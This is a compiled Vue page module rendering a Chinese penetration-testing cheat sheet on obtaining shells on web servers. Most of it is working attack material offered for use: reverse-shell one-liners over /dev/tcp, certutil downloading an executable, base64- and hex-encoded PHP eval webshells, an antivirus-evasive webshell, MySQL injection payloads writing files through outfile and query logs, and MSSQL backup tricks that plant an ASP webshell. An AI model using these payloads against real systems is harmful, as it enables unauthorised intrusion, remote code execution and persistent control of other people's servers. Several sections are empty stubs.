import{_ as c}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as d,a as s,d as o,w as a,b as n,e as i,r as u}from"./app.97ace05d.js";const k={},m=s("h2",{id:"查找网站目录",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#查找网站目录","aria-hidden":"true"},"#"),n(" 查找网站目录")],-1),h=s("div",{class:"custom-container tip"},[s("p",{class:"custom-container-title"},"黑盒方式"),s("p",null,"1、Web页面报错信息"),s("p",null,"2、字典爆破"),s("p",null,"3、旁站的目录")],-1),b={class:"custom-container info"},v=s("p",{class:"custom-container-title"},"可执行系统命令的方式（查找文件）",-1),g=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token function"},"find"),n(" / "),s("span",{class:"token parameter variable"},"-name"),n(` xx.php
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"})])],-1),w=s("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[s("pre",{class:"language-powershell"},[s("code",null,[s("span",{class:"token function"},"dir"),n(),s("span",{class:"token operator"},"/"),n("s "),s("span",{class:"token operator"},"*"),s("span",{class:"token punctuation"},"."),n(`jsp
`),s("span",{class:"token keyword"},"for"),n(),s("span",{class:"token operator"},"/"),n("r C:\\ "),s("span",{class:"token operator"},"%"),n("i in "),s("span",{class:"token punctuation"},"("),n("urls"),s("span",{class:"token punctuation"},"."),s("span",{class:"token operator"},"*"),s("span",{class:"token punctuation"},")"),n(),s("span",{class:"token keyword"},"do"),n(" @"),s("span",{class:"token function"},"echo"),n(),s("span",{class:"token operator"},"%"),n(`i
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),y=i(`<h2 id="搭建用于下载木马的服务器" tabindex="-1"><a class="header-anchor" href="#搭建用于下载木马的服务器" aria-hidden="true">#</a> 搭建用于下载木马的服务器</h2><p>基于Centos7系统</p><h3 id="http" tabindex="-1"><a class="header-anchor" href="#http" aria-hidden="true">#</a> HTTP</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>yum <span class="token function">install</span> yum-plugin-copr
yum copr <span class="token builtin class-name">enable</span> @caddy/caddy
yum <span class="token function">install</span> caddy
systemctl start caddy

<span class="token comment">#默认目录 /usr/share/caddy</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="ftp" tabindex="-1"><a class="header-anchor" href="#ftp" aria-hidden="true">#</a> FTP</h3><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="目标出网getshell" tabindex="-1"><a class="header-anchor" href="#目标出网getshell" aria-hidden="true">#</a> 目标出网Getshell</h2>`,7),f=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token function"},"wget"),n(" http://127.0.0.1/123.txt "),s("span",{class:"token parameter variable"},"-O"),n(),s("span",{class:"token number"},"123"),n(`.txt
`),s("span",{class:"token function"},"curl"),n(" http://127.0.0.1/123.txt "),s("span",{class:"token parameter variable"},"-o"),n(),s("span",{class:"token number"},"666"),n(`.txt

`),s("span",{class:"token comment"},"#VPS监听-反弹shell"),n(`
`),s("span",{class:"token function"},"nc"),n(),s("span",{class:"token parameter variable"},"-lvp"),n(),s("span",{class:"token number"},"1234"),n(`

`),s("span",{class:"token comment"},"#目标主机执行"),n(`
/bin/bash `),s("span",{class:"token parameter variable"},"-i"),n(),s("span",{class:"token operator"},"&>"),n(" /dev/tcp/192.168.0.198/1234 "),s("span",{class:"token operator"},"<"),s("span",{class:"token file-descriptor important"},"&1"),n(`
/bin/sh `),s("span",{class:"token parameter variable"},"-i"),n(),s("span",{class:"token operator"},"&>"),n(" /dev/tcp/192.168.0.198/1234 "),s("span",{class:"token operator"},"<"),s("span",{class:"token file-descriptor important"},"&1"),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),x=s("div",{class:"language-powershell line-numbers-mode","data-ext":"powershell"},[s("pre",{class:"language-powershell"},[s("code",null,[n("certutil "),s("span",{class:"token operator"},"-"),n("urlcache "),s("span",{class:"token operator"},"-"),n("split "),s("span",{class:"token operator"},"-"),n("f http:"),s("span",{class:"token operator"},"/"),s("span",{class:"token operator"},"/"),n("10"),s("span",{class:"token punctuation"},"."),n("0"),s("span",{class:"token punctuation"},"."),n("1"),s("span",{class:"token punctuation"},"."),n("1/npc"),s("span",{class:"token punctuation"},"."),n("exe C:\\Users\\Public\\Videos\\setup"),s("span",{class:"token punctuation"},"."),n(`exe

powershell`),s("span",{class:"token punctuation"},"."),n(`exe

`),s("span",{class:"token comment"},"#如果装有ftp可以用这种方法bypass杀软"),n(`
ftp open 192`),s("span",{class:"token punctuation"},"."),n("168"),s("span",{class:"token punctuation"},"."),n("1"),s("span",{class:"token punctuation"},"."),n(`111
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),_=s("h2",{id:"目标不出网getshell",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#目标不出网getshell","aria-hidden":"true"},"#"),n(" 目标不出网Getshell")],-1),q=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token comment"},"#echo 写shell"),n(`
`),s("span",{class:"token comment"},"#直接写入"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},"'<?php eval($_POST[1]); ?>'"),n(),s("span",{class:"token operator"},">"),n(),s("span",{class:"token number"},"1"),n(`.php

`),s("span",{class:"token comment"},"#base64写入"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},'"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="'),n(),s("span",{class:"token operator"},"|"),n(" base64 "),s("span",{class:"token parameter variable"},"-d"),n(),s("span",{class:"token operator"},">"),s("span",{class:"token number"},"2"),n(`.php

`),s("span",{class:"token comment"},"#绕过重定向载荷"),n(`
`),s("span",{class:"token builtin class-name"},"echo"),n(),s("span",{class:"token string"},'"ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA="'),n(),s("span",{class:"token operator"},"|"),n(" base64 "),s("span",{class:"token parameter variable"},"-d"),n(),s("span",{class:"token operator"},"|"),n(),s("span",{class:"token function"},"bash"),n(`

`),s("span",{class:"token comment"},"#hex写入"),n(`
https://www.107000.com/T-Hex/
`),s("span",{class:"token builtin class-name"},"echo"),n(" 3C3F706870206576616C28245F504F53545B315D293B203F3E"),s("span",{class:"token operator"},"|"),n("xxd "),s("span",{class:"token parameter variable"},"-r"),n(),s("span",{class:"token parameter variable"},"-ps"),n(),s("span",{class:"token operator"},">"),n(),s("span",{class:"token number"},"5"),n(`.php

`),s("span",{class:"token comment"},"#cat写shell"),n(`
`),s("span",{class:"token function"},"cat"),n(),s("span",{class:"token operator"},">>"),n(" xxx.jsp "),s("span",{class:"token operator"},"<<"),s("span",{class:"token string"},`EOF
xxx马子内容
EOF`),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),C=s("div",{class:"language-bash line-numbers-mode","data-ext":"sh"},[s("pre",{class:"language-bash"},[s("code",null,[s("span",{class:"token builtin class-name"},"echo"),n(" ^"),s("span",{class:"token operator"},"<"),n("?php @eval"),s("span",{class:"token punctuation"},"("),s("span",{class:"token variable"},"$_POST"),s("span",{class:"token punctuation"},"["),s("span",{class:"token number"},"6"),s("span",{class:"token punctuation"},"]"),s("span",{class:"token punctuation"},")"),n("?^"),s("span",{class:"token operator"},">"),n(),s("span",{class:"token operator"},">"),n(" D:"),s("span",{class:"token punctuation"},"\\"),n("wwwroot"),s("span",{class:"token punctuation"},"\\"),n(`x.php
`),s("span",{class:"token comment"},"#此处 ^ 起转义作用"),n(`
`)])]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),E=i('<p>像shiro这种还能写jsp内存马</p><h2 id="mysql数据库写shell" tabindex="-1"><a class="header-anchor" href="#mysql数据库写shell" aria-hidden="true">#</a> MySQL数据库写shell</h2><details class="custom-container details"><summary>利用条件</summary><p>过滤了单引号into outfile还能用吗？不能，GPC要off才行。</p><p>1、数据库当前为root用户-dba权限</p><p>2、知道网站目录绝对路径</p><p>3、PHP的GPC为off状态（魔术引号 POST、GET、Cookie）</p><p>4、写入路径拥有写权限</p></details><div class="custom-container tip"><p class="custom-container-title">代替空格的方法</p><p>+号，%0a、%0b、%a0 、 /**/ 注释符等</p></div><h4 id="outfile和dumpfile的区别" tabindex="-1"><a class="header-anchor" href="#outfile和dumpfile的区别" aria-hidden="true">#</a> outfile和dumpfile的区别？</h4>',5),L=s("div",{class:"language-http line-numbers-mode","data-ext":"http"},[s("pre",{class:"language-http"},[s("code",null,`1、支持多行数据同时导出
2、使用联合查询时要保证两侧查询的列数相同
3、会在换行符制表符后追加反斜杠 "\\"
4、会在末尾追加行
`)]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),S=s("div",{class:"language-http line-numbers-mode","data-ext":"http"},[s("pre",{class:"language-http"},[s("code",null,`1、每次只能导出一行数据
2、不会在换行符制表符后追加反斜杠
3、不会在末尾追加行
`)]),s("div",{class:"line-numbers","aria-hidden":"true"},[s("div",{class:"line-number"}),s("div",{class:"line-number"}),s("div",{class:"line-number"})])],-1),T=i(`<p>因此，我们可以使用dumpfile这个函数来顺利写入二进制文件;</p><p>当然outfile函数也可以写入二进制文件，只是无法生效（追加的反斜杠会使二进制文件无法生效）</p><p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制</p><h3 id="基于union联合查询" tabindex="-1"><a class="header-anchor" href="#基于union联合查询" aria-hidden="true">#</a> 基于UNION联合查询</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:\\www\\info.php&#39;</span><span class="token operator">%</span><span class="token number">23</span>
?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">&#39;C:\\www\\info.php&#39;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="非联合查询" tabindex="-1"><a class="header-anchor" href="#非联合查询" aria-hidden="true">#</a> 非联合查询</h3><p>当我们无法使用联合查询时，我们可以使用 fields terminated by与 lines terminated by来写shell</p><p>字段终止于</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>?id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">&#39;C:\\info.php&#39;</span> <span class="token keyword">FIELDS</span> <span class="token keyword">TERMINATED</span> <span class="token keyword">BY</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="基于日志写shell" tabindex="-1"><a class="header-anchor" href="#基于日志写shell" aria-hidden="true">#</a> 基于日志写Shell</h3><details class="custom-container details"><summary>突破secure-file-priv写shell</summary><p>secure-file-priv参数是用来限制导入|导出目录的；</p><p>当secure_file_priv没有具体值时，表示不对MySQL的导入|导出做限制，null表示不允许导入导出。</p><p>而且在mysql 5.6.34版本以后 secure_file_priv 的值默认为NULL。并且无法用SQL语句对其进行修改。</p></details><p>outfile被禁止，或者写入文件被拦截，没写权限 ，有root权限的情况下可以用日志写shell。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">&#39;%general%&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--开启日志监测，默认关闭(如果一直开文件会很大的)</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log <span class="token operator">=</span> <span class="token keyword">on</span><span class="token punctuation">;</span>

<span class="token comment">--设置日志路径</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> general_log_file <span class="token operator">=</span> <span class="token string">&#39;/var/www/html/info.php&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--执行查询，写入shell</span>
<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">select</span> <span class="token string">&quot;&lt;?php $sl = create_function(&#39;&#39;, @$_REQUEST[&#39;admin&#39;]);$sl();?&gt;&quot;</span><span class="token punctuation">;</span> <span class="token comment">--免杀shell</span>

<span class="token comment">--结束后，恢复日志路径，关闭日志监测</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="慢查询写shell" tabindex="-1"><a class="header-anchor" href="#慢查询写shell" aria-hidden="true">#</a> 慢查询写shell</h3><p>开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错，这时候可以用慢查询。</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--查看慢查询信息</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">&#39;%slow_query_log%&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--启用慢查询日志(默认禁用)</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>

<span class="token comment">--修改日志文件路径</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log_file<span class="token operator">=</span><span class="token string">&#39;C:\\\\phpStudy\\\\WWW\\\\shell.php&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--写入Shell</span>
<span class="token keyword">select</span> <span class="token string">&#39;&lt;?php phpinfo();?&gt;&#39;</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><details class="custom-container details"><summary>慢查询补充</summary><p>只有当查询语句执行时间超过系统默认的10秒,该语句才会被记入进慢查询日志</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">&#39;%long_query_time%&#39;</span><span class="token punctuation">;</span>
<span class="token comment">--查看服务器默认时间值</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></details><h2 id="mssql数据库写shell" tabindex="-1"><a class="header-anchor" href="#mssql数据库写shell" aria-hidden="true">#</a> MSSQL数据库写shell</h2><p>MSSQL就是微软的SQL Server数据库。</p><details class="custom-container details"><summary>利用条件</summary><ol><li>有相应的数据库权限</li><li>知道web目录的绝对路径</li></ol></details><h3 id="用存储过程搜索绝对路径" tabindex="-1"><a class="header-anchor" href="#用存储过程搜索绝对路径" aria-hidden="true">#</a> 用存储过程搜索绝对路径</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>xecute master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span> <span class="token comment">--列出所有c:\\文件、目录、子目录 </span>
<span class="token keyword">execute</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment">--只列c:\\目录</span>
<span class="token keyword">execute</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token comment">--列c:\\目录、文件</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>实际利用时可以创建一个临时表把存储过程查询到的路径插入到临时表中</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> tmp <span class="token punctuation">(</span>dir <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>num <span class="token keyword">int</span><span class="token punctuation">,</span>num1 <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> tmp<span class="token punctuation">(</span>dir<span class="token punctuation">,</span>num<span class="token punctuation">,</span>num1<span class="token punctuation">)</span> <span class="token keyword">execute</span> master<span class="token punctuation">.</span><span class="token punctuation">.</span>xp_dirtree <span class="token string">&#39;c:&#39;</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="xp-cmdshell拿shell" tabindex="-1"><a class="header-anchor" href="#xp-cmdshell拿shell" aria-hidden="true">#</a> xp_cmdshell拿Shell</h3><p>这种方法就是cmd来执行系统命令，需要注意转义字符，具体步骤看数据库提权章节中的代码。</p><h3 id="差异备份拿shell" tabindex="-1"><a class="header-anchor" href="#差异备份拿shell" aria-hidden="true">#</a> 差异备份拿shell</h3><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token comment">--完整备份一次，保存位置可更改</span>
<span class="token keyword">backup</span> <span class="token keyword">database</span> 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\Users\\Public\\Music\\bak.bak&#39;</span><span class="token punctuation">;</span>

<span class="token comment">--创建表并插入一句话(密码a)</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>test<span class="token punctuation">]</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span> <span class="token punctuation">[</span>image<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">insert</span> <span class="token keyword">into</span> test<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token number">0x3C25657865637574652872657175657374282261222929253E</span><span class="token punctuation">)</span>

<span class="token comment">--进行差异备份</span>
<span class="token keyword">backup</span> <span class="token keyword">database</span> 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span><span class="token operator">=</span><span class="token string">&#39;C:\\www\\shell.asp&#39;</span> <span class="token keyword">WITH</span> DIFFERENTIAL<span class="token punctuation">,</span>FORMAT<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当过滤了特殊的字符比如单引号，或者路径符号可以使用定义局部变量来执行</p><h3 id="log备份拿shell" tabindex="-1"><a class="header-anchor" href="#log备份拿shell" aria-hidden="true">#</a> Log备份拿shell</h3><details class="custom-container details"><summary>利用条件</summary><p>LOG 备份需要先把指定的数据库激活为还原模式;</p><p>所以需要执行<code>alter database XXX set RECOVERY FUL</code></p><p>目标机器的数据库备份过，而且选择恢复模式得是完整模式</p><p>但是使用 log 备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式。</p></details><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">alter</span> <span class="token keyword">database</span> 库名 <span class="token keyword">set</span> RECOVERY <span class="token keyword">FULL</span> 
<span class="token keyword">create</span> <span class="token keyword">table</span> cmd <span class="token punctuation">(</span>a image<span class="token punctuation">)</span> 
<span class="token keyword">backup</span> log 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\Users\\Public\\Music&#39;</span> <span class="token keyword">with</span> init 
<span class="token keyword">insert</span> <span class="token keyword">into</span> cmd <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token number">0x3C25657865637574652872657175657374282261222929253E</span><span class="token punctuation">)</span> 
<span class="token keyword">backup</span> log 库名 <span class="token keyword">to</span> <span class="token keyword">disk</span> <span class="token operator">=</span> <span class="token string">&#39;C:\\www\\shell.asp&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>相对于差异备份，log 备份出来的 webshell 文件体积非常的小。</p><h2 id="postgresql执行命令" tabindex="-1"><a class="header-anchor" href="#postgresql执行命令" aria-hidden="true">#</a> PostgreSQL执行命令</h2><h2 id="redis缓存数据库写shell" tabindex="-1"><a class="header-anchor" href="#redis缓存数据库写shell" aria-hidden="true">#</a> Redis缓存数据库写Shell</h2>`,35);function A(N,P){const p=u("Tabs");return r(),d("div",null,[m,h,s("div",b,[v,o(p,{id:"15",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:l,isActive:t})=>[g]),tab1:a(({title:e,value:l,isActive:t})=>[w]),_:1})]),y,o(p,{id:"41",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:l,isActive:t})=>[f]),tab1:a(({title:e,value:l,isActive:t})=>[x]),_:1}),_,o(p,{id:"52",data:[{title:"Linux"},{title:"Windows"}]},{tab0:a(({title:e,value:l,isActive:t})=>[q]),tab1:a(({title:e,value:l,isActive:t})=>[C]),_:1}),E,o(p,{id:"91",data:[{title:"outfile"},{title:"dumpfile"}]},{tab0:a(({title:e,value:l,isActive:t})=>[L]),tab1:a(({title:e,value:l,isActive:t})=>[S]),_:1}),T])}const I=c(k,[["render",A],["__file","Getshell权限获取.html.vue"]]);export{I as default};
